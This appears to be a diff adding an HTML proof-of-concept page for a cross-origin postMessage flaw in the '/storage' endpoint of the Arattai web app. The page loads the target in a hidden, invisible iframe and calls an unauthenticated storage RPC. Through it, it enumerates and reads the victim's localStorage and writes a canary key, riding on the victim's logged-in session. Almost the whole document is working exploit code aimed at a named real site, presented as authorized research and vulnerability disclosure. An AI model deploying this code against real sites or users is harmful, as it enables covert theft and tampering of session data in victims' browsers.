@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Arattai /storage Cross-Origin postMessage PoC</title>
+<style>
+  body { font-family: -apple-system, Segoe UI, Arial, sans-serif; max-width: 900px; margin: 24px auto; padding: 0 16px; color: #1b1b1b; }
+  h1 { font-size: 20px; }
+  .banner { background: #fff3cd; border: 1px solid #e0a800; padding: 10px 14px; border-radius: 6px; font-size: 13px; margin-bottom: 20px; }
+  .row { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
+  input[type=text] { flex: 1; min-width: 260px; padding: 6px 8px; font-family: monospace; }
+  button { padding: 7px 14px; cursor: pointer; }
+  #log { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 12px; border-radius: 6px; white-space: pre-wrap; height: 380px; overflow: auto; }
+  table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
+  th, td { border: 1px solid #ccc; padding: 6px 8px; text-align: left; vertical-align: top; }
+  th { background: #f0f0f0; }
+  .vuln { color: #b30000; font-weight: bold; }
+  .safe { color: #067d06; font-weight: bold; }
+  .pending { color: #888; }
+  iframe.hidden-target { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+  code { background: #eee; padding: 1px 5px; border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<h1>Arattai <code>/storage</code> Cross-Origin <code>postMessage</code> PoC (Finding F1)</h1>
+
+<div class="banner">
+  <strong>Authorized internal security research only.</strong> This page demonstrates that any external
+  origin can frame <code>&lt;target&gt;/storage</code> and drive the unauthenticated <code>db-handler.js</code>
+  <code>postMessage</code> RPC to read/enumerate/write the victim's <code>localStorage</code> on the target
+  origin, from an attacker page, using the victim's existing session cookies. Do not use outside an
+  authorized test environment. See the companion report
+  <code>../storage-bridge-cross-origin-report.md</code> for full source evidence.
+</div>
+
+<div class="row">
+  <label style="width:100%">Target origin (must have an active, logged-in session for a real result):</label>
+  <input id="targetOrigin" type="text" value="https://web.arattai.in">
+</div>
+<div class="row">
+  <button id="btnLoad">1. Load /storage in hidden iframe</button>
+  <button id="btnEnumerate" disabled>2. Enumerate + read localStorage keys</button>
+  <button id="btnWriteProbe" disabled>3. Write-probe (harmless canary key)</button>
+  <button id="btnClear">Clear log</button>
+</div>
+
+<table>
+  <thead><tr><th style="width:26%">Probe</th><th style="width:12%">Status</th><th>Detail</th></tr></thead>
+  <tbody id="resultsBody">
+    <tr><td>Frame load / <code>arattai_iframe_loaded</code> handshake</td><td id="s-load" class="pending">PENDING</td><td id="d-load">—</td></tr>
+    <tr><td>Origin validation on receiver</td><td id="s-origin" class="pending">PENDING</td><td id="d-origin">Expect REJECT after remediation; today expect no check.</td></tr>
+    <tr><td>Key enumeration (<code>localStorage.key(i)</code>)</td><td id="s-enum" class="pending">PENDING</td><td id="d-enum">—</td></tr>
+    <tr><td>Value read (<code>localStorage.getItem</code>)</td><td id="s-read" class="pending">PENDING</td><td id="d-read">—</td></tr>
+    <tr><td>Write (<code>localStorage.setItem</code>)</td><td id="s-write" class="pending">PENDING</td><td id="d-write">—</td></tr>
+  </tbody>
+</table>
+
+<h3>Live log</h3>
+<div id="log"></div>
+
+<script>
+(function () {
+  var frame = null;
+  var pending = {};
+  var reqCounter = 0;
+  var loaded = false;
+  var CANARY_KEY = "__arattai_poc_canary__";
+  var CANARY_VAL = "poc-write-" + Date.now();
+
+  function logLine(msg, obj) {
+    var el = document.getElementById('log');
+    var ts = new Date().toISOString().split('T')[1].replace('Z', '');
+    var text = '[' + ts + '] ' + msg + (obj !== undefined ? ' ' + JSON.stringify(obj) : '');
+    el.textContent += text + '\n';
+    el.scrollTop = el.scrollHeight;
+    console.log('[PoC]', msg, obj);
+  }
+
+  function setStatus(rowId, status, detail) {
+    var s = document.getElementById('s-' + rowId);
+    var d = document.getElementById('d-' + rowId);
+    s.textContent = status;
+    s.className = status === 'VULN' ? 'vuln' : (status === 'SAFE' ? 'safe' : 'pending');
+    if (detail !== undefined) d.textContent = detail;
+  }
+
+  function targetOrigin() {
+    return document.getElementById('targetOrigin').value.replace(/\/$/, '');
+  }
+
+  function nextId() {
+    return 'poc-' + (++reqCounter) + '-' + Math.random().toString(36).slice(2);
+  }
+
+  function send(msgObj) {
+    if (!frame || !frame.contentWindow) { logLine('ERROR: frame not ready'); return; }
+    // Deliberately send with targetOrigin '*' — this is the attacker's own choice, irrelevant
+    // to whether the RECEIVER validates event.origin. That is exactly what we are testing.
+    frame.contentWindow.postMessage(msgObj, '*');
+    logLine('SENT ->', msgObj);
+  }
+
+  window.addEventListener('message', function (event) {
+    var data = event.data;
+    if (!data || typeof data !== 'object') return;
+
+    if (data.type === 'arattai_iframe_loaded') {
+      loaded = true;
+      logLine('RECV <- arattai_iframe_loaded (handshake)', { origin: event.origin });
+      setStatus('load', 'VULN', 'Frame at ' + targetOrigin() + '/storage loaded inside this ' +
+        'cross-origin page and announced readiness to us (attacker origin ' + location.origin + '). ' +
+        'A same-origin-only shell would never receive this from an external page.');
+      setStatus('origin', 'VULN', 'Handshake was accepted with target-origin arg "*" and no origin ' +
+        'gate on the receiver side (db-handler.js:15) — see log for raw event.');
+      document.getElementById('btnEnumerate').disabled = false;
+      document.getElementById('btnWriteProbe').disabled = false;
+      return;
+    }
+
+    if (data.type === 'LocalStorageResponse' && data.requestId && pending[data.requestId]) {
+      var req = pending[data.requestId];
+      delete pending[data.requestId];
+      logLine('RECV <- LocalStorageResponse for ' + req.label, { origin: event.origin, result: data.result, error: data.error });
+      req.resolve(data);
+    }
+  });
+
+  document.getElementById('btnLoad').onclick = function () {
+    var origin = targetOrigin();
+    if (frame) { frame.remove(); }
+    loaded = false;
+    frame = document.createElement('iframe');
+    frame.className = 'hidden-target';
+    frame.src = origin + '/storage';
+    document.body.appendChild(frame);
+    logLine('Framing ' + origin + '/storage from attacker origin ' + location.origin);
+    setStatus('load', 'PENDING', 'waiting for iframe onload + handshake…');
+    setTimeout(function () {
+      if (!loaded) {
+        setStatus('load', 'SAFE', 'No handshake received within 8s — frame likely blocked ' +
+          '(X-Frame-Options/frame-ancestors), session not authenticated, or receiver now origin-checked.');
+      }
+    }, 8000);
+  };
+
+  function requestLocalStorage(methodName, args, label) {
+    return new Promise(function (resolve) {
+      var id = nextId();
+      pending[id] = { resolve: resolve, label: label };
+      send({ type: 'LocalStorageRequest', requestId: id, params: { methodName: methodName, arguments: args } });
+      setTimeout(function () {
+        if (pending[id]) { delete pending[id]; resolve({ timeout: true }); }
+      }, 5000);
+    });
+  }
+
+  document.getElementById('btnEnumerate').onclick = async function () {
+    logLine('--- Enumerating localStorage keys on ' + targetOrigin() + ' via localStorage.key(i) ---');
+    var keys = [];
+    for (var i = 0; i < 40; i++) {
+      var resp = await requestLocalStorage('key', i, 'key(' + i + ')');
+      if (resp.timeout) { logLine('key(' + i + ') timed out — stopping enumeration'); break; }
+      if (resp.error || resp.result === null || resp.result === undefined) break;
+      keys.push(resp.result);
+    }
+    if (keys.length) {
+      setStatus('enum', 'VULN', keys.length + ' key(s) enumerated cross-origin: ' + keys.join(', '));
+      logLine('Enumerated keys:', keys);
+
+      logLine('--- Reading value of first key via localStorage.getItem ---');
+      var readResp = await requestLocalStorage('getItem', keys[0], 'getItem(' + keys[0] + ')');
+      if (!readResp.timeout && !readResp.error) {
+        setStatus('read', 'VULN', 'Value of "' + keys[0] + '" read cross-origin (truncated): ' +
+          String(readResp.result).slice(0, 200));
+      } else {
+        setStatus('read', 'SAFE', 'No value returned (blocked or empty).');
+      }
+    } else {
+      setStatus('enum', 'SAFE', 'No keys returned — receiver rejected the request or storage is empty.');
+      setStatus('read', 'SAFE', 'Skipped — enumeration returned no keys.');
+    }
+  };
+
+  document.getElementById('btnWriteProbe').onclick = async function () {
+    logLine('--- Write-probe: localStorage.setItem("' + CANARY_KEY + '", "' + CANARY_VAL + '") ---');
+    var writeResp = await requestLocalStorage('setItem', [CANARY_KEY, CANARY_VAL], 'setItem(canary)');
+    if (writeResp.timeout) {
+      setStatus('write', 'SAFE', 'setItem timed out — no confirmation.');
+      return;
+    }
+    logLine('--- Verifying write via getItem ---');
+    var readBack = await requestLocalStorage('getItem', CANARY_KEY, 'getItem(canary)');
+    if (!readBack.timeout && readBack.result === CANARY_VAL) {
+      setStatus('write', 'VULN', 'Cross-origin write CONFIRMED — canary key/value round-tripped on ' +
+        targetOrigin() + '. Cleaning up…');
+      await requestLocalStorage('removeItem', CANARY_KEY, 'removeItem(canary)');
+      logLine('Canary key removed.');
+    } else {
+      setStatus('write', 'SAFE', 'Write not confirmed (blocked or origin-checked).');
+    }
+  };
+
+  document.getElementById('btnClear').onclick = function () {
+    document.getElementById('log').textContent = '';
+  };
+})();
+</script>
+</body>
+</html>
